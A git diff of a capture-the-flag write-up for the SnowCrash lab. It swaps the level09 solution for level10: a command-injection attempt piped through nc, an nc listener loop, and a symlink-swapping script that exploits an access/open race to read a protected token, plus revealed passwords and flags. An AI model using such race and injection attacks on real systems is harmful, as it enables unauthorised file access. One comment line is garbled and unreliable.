@@ -27,49 +27,64 @@ level10@SnowCrash:~$ ./level10 token
 level10@SnowCrash:~$ cat token
 cat: token: Permission denied
 
-# We see there is unprintable characters so lets see what it is with using vim
-level09@SnowCrash:~$ vim token
-f4kmm6p|=~B^?p~Bn~C~BDB~CDu{^?~L~I
+# Lets see if we can exploit it with echo and using nc with our localhost 5151  and give us the password too and 6969 only gives the flag
+#	Note localhost 5151 is home in networking
+echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
 
-# Lets see what we get with giving level09 our own argument and see the out put
-level09@SnowCrash:~$ ./level09 Gabe
-Gbdh
-level09@SnowCrash:~$ ./level09 test
-tfuw
-level09@SnowCrash:~$ ./level09 abcd
-aceg
-level09@SnowCrash:~$ ./level09 aaaa
-abcd
-level09@SnowCrash:~$ ./level09 1234
-1357
-level09@SnowCrash:~$ ./level09 1111
-1234
+level10@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
+Password: Erf nope..
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 
-# Bingo! now we see a pattern emerged and we can see that the program is incrementing the ascii value of the inputs by the coloumb number it is in
-							   0123		it increases by 1 as the coloumb number of the character
-level09@SnowCrash:~$ ./level09 aaaa
-abcd
-#		Thus it will increase that current character in the coloumb by the coloumb number, starting from 0 
+level10@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 6969 && cat /tmp/Gabe
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 
-# So all we need to do is make a script that will reverse this on the token file, making a tmp of that token file with the reversed effect
+# OOPS this did not work. when I enter the password it did not work
 
-level09@SnowCrash:~$ vim /tmp/reverse.py
+# 	Okay but it wasn't a complete waste and we show that we are on the correct path and we need to use port 6969 instead
 
-import sys
+We decompile on an online tool, and we realize that there is a race condition: If between the call to access and the call to open, 
+the file named by argv [1] changes, we can read an arbitrary file.
 
-for i, val in enumerate(sys.argv[1]):
-     sys.stdout.write(chr(ord(val)-i))
-     sys.stdout.flush()
-print
+# So we open a shell on which we listen in loop with the following command:
+#	while [42]; do nc-1 6969; therefore
 
-# Now we will run this script on the token file and cat it
-level09@SnowCrash:~$ python /tmp/reverse.py `cat token`
-f3iji1ju5yuevaus41q1afiuq
+vim listener.sh
 
-# Remember to su the flag as this only gave us the Password for the flag.
+#!/bin/sh
+while [ 42 ] ; do nc -l 6969; done
 
-level09@SnowCrash:~$ su flag09
-Password:
+# We create a shell script that will try to bruteforce this race condition: It will call the binary between two calls to ln to try to 
+#	change the symbolic link running. We see the following password in our second shell:
+
+vim bruteForce.sh
+#!/bin/sh
+touch /tmp/gabe
+  while true; do
+       ln -sf /tmp/gabe /tmp/copyToken  &
+       /home/user/level10/level10 /tmp/copyToken 127.0.0.1 &
+       ln -sf /home/user/level10/token /tmp/copyToken &
+  done
+
+# Note you will need 2 terminals conntected to the ssh level10@192.168.56.101 -p 4242
+# 	Run the listener.sh first on the one.
+#		On the other run bruteforce.sh
+#	once you see the below then stop the listener.sh with control c
+
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+^C
+
+# The above is your password for the flag10
+
+level10@SnowCrash:~$ su flag10
+Password: woupa2yuojeeaaed06riuj63c
 Don't forget to launch getflag !
-flag09@SnowCrash:~$ getflag
-Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+
+
+Resources
+https://linux.die.net/man/1/nc
+https://books.google.co.za/books?id=xpSSXvoQBq4C&pg=PA178&lpg=PA178&dq=what+localhost+5151&source=bl&ots=SqC25oe3eL&sig=ytJE2dfwMrG6ZMdjQfLyKKwNoaI&hl=en&sa=X&redir_esc=y#v=onepage&q=what%20localhost%205151&f=false
+
